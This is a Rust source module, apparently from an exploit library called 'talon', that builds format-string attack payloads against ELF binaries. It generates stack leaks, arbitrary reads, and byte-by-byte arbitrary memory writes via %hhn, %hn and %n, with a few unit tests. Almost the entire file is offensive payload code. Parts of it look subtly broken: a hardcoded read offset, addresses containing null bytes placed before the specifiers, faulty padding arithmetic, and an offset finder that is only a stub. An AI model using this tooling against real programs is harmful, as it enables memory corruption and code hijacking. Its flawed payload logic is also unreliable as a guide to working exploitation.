// ═══════════════════════════════════════════════════════════════════════════
// FORMAT STRING AUTO-EXPLOIT
// ═══════════════════════════════════════════════════════════════════════════

use std::collections::HashMap;

/// Format string exploit builder
pub struct FormatString {
    pub binary_path: String,
    pub offset: usize,
    pub arch: Architecture,
    pub writes: HashMap<u64, u64>, // address -> value
}

#[derive(Debug, Clone)]
pub enum Architecture {
    X8664,
    I386,
}

impl FormatString {
    /// Create a new format string exploiter from binary analysis
    /// 
    /// # Example
    /// ```no_run
    /// # use talon::fmtstr_tools::FormatString;
    /// # fn main() -> Result<(), String> {
    /// let mut fmt = FormatString::new("./vuln", 6)?;
    /// fmt.write(0x601048, 0xdeadbeef);
    /// let payload = fmt.generate()?;
    /// # Ok(())
    /// # }
    /// ```
    pub fn new(binary_path: &str, offset: usize) -> Result<Self, String> {
        log::info!("Initializing format string exploit for {}", binary_path);
        log::info!("Format string offset: {}", offset);
        
        // Detect architecture
        let arch = Self::detect_arch(binary_path)?;
        
        Ok(FormatString {
            binary_path: binary_path.to_string(),
            offset,
            arch,
            writes: HashMap::new(),
        })
    }
    
    /// Create a new format string exploiter with default settings (x86-64, no binary analysis)
    /// 
    /// # Example
    /// ```
    /// # use talon::fmtstr_tools::FormatString;
    /// # fn main() -> Result<(), String> {
    /// let mut fmt = FormatString::from_offset(6);
    /// fmt.write(0x601048, 0xdeadbeef);
    /// let payload = fmt.generate()?;
    /// # Ok(())
    /// # }
    /// ```
    pub fn from_offset(offset: usize) -> Self {
        FormatString {
            binary_path: String::new(),
            offset,
            arch: Architecture::X8664,
            writes: HashMap::new(),
        }
    }
    
    /// Add a write operation
    pub fn write(&mut self, address: u64, value: u64) {
        log::info!("Queueing write: 0x{:x} = 0x{:x}", address, value);
        self.writes.insert(address, value);
    }
    
    /// Generate a leak payload for a specific offset
    pub fn leak(&self, target_offset: usize) -> String {
        format!("%{}$p", target_offset)
    }
    
    /// Generate a leak payload for an address
    pub fn leak_address(&self, address: u64) -> Vec<u8> {
        let mut payload = Vec::new();
        
        // Write address
        payload.extend_from_slice(&address.to_le_bytes());
        
        // Add padding to reach offset
        let padding_needed = (self.offset * 8) - 8;
        payload.extend_from_slice(&vec![b'A'; padding_needed]);
        
        // Add format string specifier to read from address
        payload.extend_from_slice(b"%7$s"); // Assuming address is at offset 7
        
        payload
    }
    
    /// Generate full exploit payload with optimized writes
    pub fn generate(&self) -> Result<Vec<u8>, String> {
        if self.writes.is_empty() {
            return Err("No writes specified".to_string());
        }
        
        log::info!("Generating optimized format string payload for {} writes", self.writes.len());
        
        // Strategy: Write byte-by-byte using %hhn for maximum control
        let mut payload = Vec::new();
        let mut current_offset = self.offset;
        
        for (addr, value) in &self.writes {
            // Write each byte of the value
            for byte_idx in 0..8 {
                let target_addr = addr + byte_idx;
                let target_byte = ((value >> (byte_idx * 8)) & 0xFF) as u8;
                
                // Skip null bytes
                if target_byte == 0 {
                    continue;
                }
                
                // Add address to payload
                payload.extend_from_slice(&target_addr.to_le_bytes());
                
                // Calculate padding needed
                let bytes_written = payload.len() % 256;
                let padding_needed = if target_byte > bytes_written as u8 {
                    target_byte as usize - bytes_written
                } else {
                    256 + target_byte as usize - bytes_written
                };
                
                // Generate format string for this byte
                let fmt = if padding_needed > 0 {
                    format!("%{}c%{}$hhn", padding_needed, current_offset)
                } else {
                    format!("%{}$hhn", current_offset)
                };
                payload.extend_from_slice(fmt.as_bytes());
                current_offset += 1;
            }
        }
        
        log::info!("Generated payload: {} bytes", payload.len());
        Ok(payload)
    }
    
    /// Generate payload for arbitrary write with automatic optimization
    pub fn generate_write_payload(&self, address: u64, value: u64) -> Vec<u8> {
        let mut payload = Vec::new();
        
        // Use %n for full word writes when possible
        let value32 = (value & 0xFFFFFFFF) as u32;
        
        // Add address
        payload.extend_from_slice(&address.to_le_bytes());
        
        // Padding to align
        while payload.len() % 8 != 0 {
            payload.push(b'A');
        }
        
        // Calculate writes needed
        let bytes_to_write = value32 as usize;
        let current_bytes = payload.len();
        
        let padding = if bytes_to_write > current_bytes {
            bytes_to_write - current_bytes
        } else {
            0x10000 + bytes_to_write - current_bytes
        };
        
        // Format string
        let fmt = format!("%{}c%{}$n", padding, self.offset);
        payload.extend_from_slice(fmt.as_bytes());
        
        payload
    }
    
    /// Detect architecture
    fn detect_arch(binary_path: &str) -> Result<Architecture, String> {
        use goblin::Object;
        use std::fs;
        
        let buffer = fs::read(binary_path)
            .map_err(|e| format!("Failed to read binary: {}", e))?;
        
        match Object::parse(&buffer) {
            Ok(Object::Elf(elf)) => {
                match elf.header.e_machine {
                    goblin::elf::header::EM_X86_64 => Ok(Architecture::X8664),
                    goblin::elf::header::EM_386 => Ok(Architecture::I386),
                    _ => Err("Unsupported architecture".to_string()),
                }
            }
            _ => Err("Not an ELF binary".to_string()),
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// HELPER FUNCTIONS
// ────────────────────────────────────────────────────────────────────────────

/// Quick format string leak payload
pub fn fmtstr_leak(offset: usize) -> String {
    format!("%{}$p", offset)
}

/// Quick format string write
pub fn fmtstr_write(address: u64, value: u64, offset: usize) -> Vec<u8> {
    let mut payload = Vec::new();
    
    // Write address
    payload.extend_from_slice(&address.to_le_bytes());
    
    // Padding
    payload.extend_from_slice(&[b'A'; 8]);
    
    // Format string
    let bytes_to_write = (value & 0xFFFF) as usize;
    let fmt = format!("%{}c%{}$hn", bytes_to_write, offset);
    payload.extend_from_slice(fmt.as_bytes());
    
    payload
}

/// Generate payload to leak stack values
pub fn fmtstr_leak_stack(start_offset: usize, count: usize) -> String {
    let mut payload = String::new();
    for i in 0..count {
        payload.push_str(&format!("%{}$p.", start_offset + i));
    }
    payload
}

/// Find format string offset automatically
pub fn find_fmtstr_offset(binary_path: &str) -> Result<usize, String> {
    log::info!("Attempting to find format string offset for {}", binary_path);
    
    // In a real implementation, this would:
    // 1. Run the binary with test patterns
    // 2. Analyze output to find where input appears
    // 3. Calculate offset
    
    log::warn!("Auto-offset detection requires process execution");
    Err("Manual mode: Test with 'AAAA.%p.%p.%p...' to find offset".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fmtstr_leak() {
        let payload = fmtstr_leak(6);
        assert_eq!(payload, "%6$p");
    }

    #[test]
    fn test_fmtstr_leak_stack() {
        let payload = fmtstr_leak_stack(5, 3);
        assert!(payload.contains("%5$p"));
        assert!(payload.contains("%6$p"));
        assert!(payload.contains("%7$p"));
    }

    #[test]
    fn test_format_string_creation() {
        // Would need a real binary to fully test
        assert!(std::mem::size_of::<FormatString>() > 0);
    }
}
